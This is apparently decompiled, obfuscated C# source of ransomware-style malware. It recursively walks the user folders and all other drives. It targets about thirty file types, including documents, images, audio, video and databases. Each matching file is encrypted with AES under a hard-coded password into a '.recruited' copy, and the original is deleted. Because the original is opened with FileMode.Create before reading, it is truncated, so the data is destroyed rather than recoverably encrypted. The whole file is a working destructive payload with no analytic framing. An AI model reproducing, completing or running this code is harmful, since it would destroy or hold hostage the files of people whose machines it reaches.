using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		internal void method_0()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_1()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_2()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_3()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_4()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_5()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_6()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_7()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_8()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_9()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_10()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_11()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_12()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_13()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_14()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_15()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_16()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_17()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_18()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_19()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_20()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_21()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_22()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_23()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_24()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_25()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_26()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_27()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_28()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_29()
		{
			smethod_2(string_0, Class0.string_0);
		}

		internal void method_30()
		{
			smethod_2(string_0, Class0.string_0);
		}
	}

	private static string string_0 = "foaweijfoawe";

	private static void Main(string[] args)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		smethod_1("C:\\Users", smethod_0);
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.Name.Contains("C:") && driveInfo.IsReady)
			{
				smethod_1(driveInfo.Name, smethod_0);
			}
		}
		((Form)new Form1()).ShowDialog();
	}

	private static void smethod_0(string string_1)
	{
		if (Class0.smethod_4(Class0.smethod_3(string_1), "jihou.mp3"))
		{
			return;
		}
		try
		{
			string string_2 = Class0.smethod_5(string_1);
			switch (Class2.smethod_0(string_2))
			{
			case 1388056268u:
				if (Class0.smethod_4(string_2, ".jpg"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1605963464u:
				if (Class0.smethod_4(string_2, ".webm"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1384894805u:
				if (Class0.smethod_4(string_2, ".gif"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1128223456u:
				if (Class0.smethod_4(string_2, ".png"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1767085374u:
				if (Class0.smethod_4(string_2, ".docs"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1680899145u:
				if (Class0.smethod_4(string_2, ".pdf"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1782720565u:
				if (Class0.smethod_4(string_2, ".eps"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1932828157u:
				if (Class0.smethod_4(string_2, ".pptx"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 94991972u:
				if (Class0.smethod_4(string_2, ".accdb"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 175576948u:
				if (Class0.smethod_4(string_2, ".bmp"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 71852739u:
				if (Class0.smethod_4(string_2, ".txt"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 826795865u:
				if (Class0.smethod_4(string_2, ".pict"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 592705037u:
				if (Class0.smethod_4(string_2, ".mp3"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 475261704u:
				if (Class0.smethod_4(string_2, ".mp4"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 469959950u:
				if (Class0.smethod_4(string_2, ".xlsx"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3211133207u:
				if (Class0.smethod_4(string_2, ".flv"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3238515961u:
				if (Class0.smethod_4(string_2, ".doc"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3115564298u:
				if (Class0.smethod_4(string_2, ".odt"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2981397527u:
				if (Class0.smethod_4(string_2, ".flac"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2651941483u:
				if (Class0.smethod_4(string_2, ".csv"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2685385760u:
				if (Class0.smethod_4(string_2, ".aac"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 2467493240u:
				if (Class0.smethod_4(string_2, ".wave"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 1934861564u:
				if (Class0.smethod_4(string_2, ".docm"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 4178554255u:
				if (Class0.smethod_4(string_2, ".jpeg"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 4100894060u:
				if (Class0.smethod_4(string_2, ".tif"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3575879495u:
				if (Class0.smethod_4(string_2, ".aif"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3767956097u:
				if (Class0.smethod_4(string_2, ".mkv"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3498925813u:
				if (Class0.smethod_4(string_2, ".mov"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3560597182u:
				if (Class0.smethod_4(string_2, ".tiff"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3388221377u:
				if (Class0.smethod_4(string_2, ".avi"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			case 3478352337u:
				if (Class0.smethod_4(string_2, ".mpg"))
				{
					Class0.smethod_6((Action)delegate
					{
						smethod_2(string_1, string_0);
					});
				}
				break;
			}
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_1, Action<string> action_0)
	{
		string[] array = Class0.smethod_7(string_1);
		foreach (string obj in array)
		{
			action_0(obj);
		}
		array = Class0.smethod_8(string_1);
		foreach (string string_2 in array)
		{
			try
			{
				smethod_1(string_2, action_0);
			}
			catch
			{
			}
		}
	}

	private static bool smethod_2(string string_1, string string_2)
	{
		byte[] byte_ = new byte[4096];
		FileStream fileStream = Class0.smethod_13(Class0.smethod_12(Class0.smethod_11(Class0.smethod_9(string_1), Class0.smethod_10(string_1)), ".recruited"), FileMode.Create, FileAccess.Write);
		try
		{
			AesManaged aesManaged = Class0.smethod_14();
			try
			{
				Class0.smethod_15((SymmetricAlgorithm)aesManaged, 128);
				Class0.smethod_16((SymmetricAlgorithm)aesManaged, 128);
				Class0.smethod_17((SymmetricAlgorithm)aesManaged, CipherMode.CBC);
				Class0.smethod_18((SymmetricAlgorithm)aesManaged, PaddingMode.PKCS7);
				Rfc2898DeriveBytes rfc2898DeriveBytes = Class0.smethod_19(string_2, 16);
				byte[] array = new byte[16];
				array = Class0.smethod_20(rfc2898DeriveBytes);
				byte[] byte_2 = Class0.smethod_21((DeriveBytes)rfc2898DeriveBytes, 16);
				Class0.smethod_22((SymmetricAlgorithm)aesManaged, byte_2);
				Class0.smethod_23((SymmetricAlgorithm)aesManaged);
				ICryptoTransform icryptoTransform_ = Class0.smethod_26((SymmetricAlgorithm)aesManaged, Class0.smethod_24((SymmetricAlgorithm)aesManaged), Class0.smethod_25((SymmetricAlgorithm)aesManaged));
				CryptoStream cryptoStream = Class0.smethod_27((Stream)fileStream, icryptoTransform_, CryptoStreamMode.Write);
				try
				{
					Class0.smethod_28((Stream)fileStream, array, 0, 16);
					Class0.smethod_28((Stream)fileStream, Class0.smethod_25((SymmetricAlgorithm)aesManaged), 0, 16);
					DeflateStream deflateStream = Class0.smethod_29((Stream)cryptoStream, CompressionMode.Compress);
					try
					{
						FileStream fileStream2 = Class0.smethod_30(string_1, FileMode.Create);
						try
						{
							int int_;
							while ((int_ = Class0.smethod_31((Stream)fileStream2, byte_, 0, 4096)) > 0)
							{
								Class0.smethod_28((Stream)deflateStream, byte_, 0, int_);
							}
						}
						finally
						{
							if (fileStream2 != null)
							{
								Class0.smethod_32((IDisposable)fileStream2);
							}
						}
					}
					finally
					{
						if (deflateStream != null)
						{
							Class0.smethod_32((IDisposable)deflateStream);
						}
					}
				}
				finally
				{
					if (cryptoStream != null)
					{
						Class0.smethod_32((IDisposable)cryptoStream);
					}
				}
			}
			finally
			{
				if (aesManaged != null)
				{
					Class0.smethod_32((IDisposable)aesManaged);
				}
			}
		}
		finally
		{
			if (fileStream != null)
			{
				Class0.smethod_32((IDisposable)fileStream);
			}
		}
		Class0.smethod_33(string_1);
		Class0.smethod_34(Class0.smethod_12(string_1, "終わり"));
		return true;
	}

	static string smethod_3(string string_1)
	{
		return Path.GetFileName(string_1);
	}

	static bool smethod_4(string string_1, string string_2)
	{
		return string_1 == string_2;
	}

	static string smethod_5(string string_1)
	{
		return Path.GetExtension(string_1);
	}

	static Task smethod_6(Action action_0)
	{
		return Task.Run(action_0);
	}

	static string[] smethod_7(string string_1)
	{
		return Directory.GetFiles(string_1);
	}

	static string[] smethod_8(string string_1)
	{
		return Directory.GetDirectories(string_1);
	}

	static string smethod_9(string string_1)
	{
		return Path.GetDirectoryName(string_1);
	}

	static string smethod_10(string string_1)
	{
		return Path.GetFileNameWithoutExtension(string_1);
	}

	static string smethod_11(string string_1, string string_2)
	{
		return Path.Combine(string_1, string_2);
	}

	static string smethod_12(string string_1, string string_2)
	{
		return string_1 + string_2;
	}

	static FileStream smethod_13(string string_1, FileMode fileMode_0, FileAccess fileAccess_0)
	{
		return new FileStream(string_1, fileMode_0, fileAccess_0);
	}

	static AesManaged smethod_14()
	{
		return new AesManaged();
	}

	static void smethod_15(SymmetricAlgorithm symmetricAlgorithm_0, int int_0)
	{
		symmetricAlgorithm_0.BlockSize = int_0;
	}

	static void smethod_16(SymmetricAlgorithm symmetricAlgorithm_0, int int_0)
	{
		symmetricAlgorithm_0.KeySize = int_0;
	}

	static void smethod_17(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0)
	{
		symmetricAlgorithm_0.Mode = cipherMode_0;
	}

	static void smethod_18(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0)
	{
		symmetricAlgorithm_0.Padding = paddingMode_0;
	}

	static Rfc2898DeriveBytes smethod_19(string string_1, int int_0)
	{
		return new Rfc2898DeriveBytes(string_1, int_0);
	}

	static byte[] smethod_20(Rfc2898DeriveBytes rfc2898DeriveBytes_0)
	{
		return rfc2898DeriveBytes_0.Salt;
	}

	static byte[] smethod_21(DeriveBytes deriveBytes_0, int int_0)
	{
		return deriveBytes_0.GetBytes(int_0);
	}

	static void smethod_22(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		symmetricAlgorithm_0.Key = byte_0;
	}

	static void smethod_23(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		symmetricAlgorithm_0.GenerateIV();
	}

	static byte[] smethod_24(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.Key;
	}

	static byte[] smethod_25(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.IV;
	}

	static ICryptoTransform smethod_26(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1)
	{
		return symmetricAlgorithm_0.CreateEncryptor(byte_0, byte_1);
	}

	static CryptoStream smethod_27(Stream stream_0, ICryptoTransform icryptoTransform_0, CryptoStreamMode cryptoStreamMode_0)
	{
		return new CryptoStream(stream_0, icryptoTransform_0, cryptoStreamMode_0);
	}

	static void smethod_28(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		stream_0.Write(byte_0, int_0, int_1);
	}

	static DeflateStream smethod_29(Stream stream_0, CompressionMode compressionMode_0)
	{
		return new DeflateStream(stream_0, compressionMode_0);
	}

	static FileStream smethod_30(string string_1, FileMode fileMode_0)
	{
		return new FileStream(string_1, fileMode_0);
	}

	static int smethod_31(Stream stream_0, byte[] byte_0, int int_0, int int_1)
	{
		return stream_0.Read(byte_0, int_0, int_1);
	}

	static void smethod_32(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static void smethod_33(string string_1)
	{
		File.Delete(string_1);
	}

	static void smethod_34(string string_1)
	{
		Console.WriteLine(string_1);
	}
}
